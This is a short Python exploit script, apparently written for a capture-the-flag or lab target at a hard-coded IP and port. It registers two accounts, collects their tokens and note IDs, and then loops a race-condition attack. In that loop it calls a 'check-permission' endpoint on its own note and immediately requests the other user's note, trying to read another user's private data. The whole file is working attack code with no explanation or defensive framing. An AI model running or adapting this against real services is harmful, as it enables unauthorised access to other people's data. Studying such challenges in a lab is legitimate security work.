#!/usr/bin/env python3
import requests
import threading
import time

BASE_URL = "http://83.136.255.203:47148"

# Create two users
print("[*] Creating two test users...")
r1 = requests.post(f"{BASE_URL}/api/auth/register", 
                  json={"email": f"user1_{int(time.time())}@test.com", "password": "test123"})
TOKEN1 = r1.json()['token']

r2 = requests.post(f"{BASE_URL}/api/auth/register",
                  json={"email": f"user2_{int(time.time())}@test.com", "password": "test123"})
TOKEN2 = r2.json()['token']

headers1 = {"Authorization": f"Bearer {TOKEN1}"}
headers2 = {"Authorization": f"Bearer {TOKEN2}"}

# Get notes for each user
notes1 = requests.get(f"{BASE_URL}/api/notes", headers=headers1).json()['notes']
notes2 = requests.get(f"{BASE_URL}/api/notes", headers=headers2).json()['notes']

print(f"[*] User1 notes: {[n['id'] for n in notes1]}")
print(f"[*] User2 notes: {[n['id'] for n in notes2]}")

my_note = notes1[0]['id']
target_note = notes2[0]['id']

print(f"\n[*] Attempting race condition attack...")
print(f"    My note: {my_note}")
print(f"    Target note (user2): {target_note}")

# Try the race condition
for attempt in range(20):
    # As user1, call check-permission on MY note
    r = requests.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", 
                    headers=headers1)
    
    # Immediately try to access user2's note
    r2 = requests.get(f"{BASE_URL}/api/notes/{target_note}", 
                     headers=headers1)
    
    result = r2.json()
    if result.get('success'):
        print(f"\n[!!!] SUCCESS on attempt {attempt+1}!")
        print(f"[!!!] Accessed user2's note as user1:")
        print(f"{result}")
        break
    else:
        print(f"  Attempt {attempt+1}: {result.get('error', 'Unknown error')}")
    
    time.sleep(0.1)

print("\n[*] Test complete")
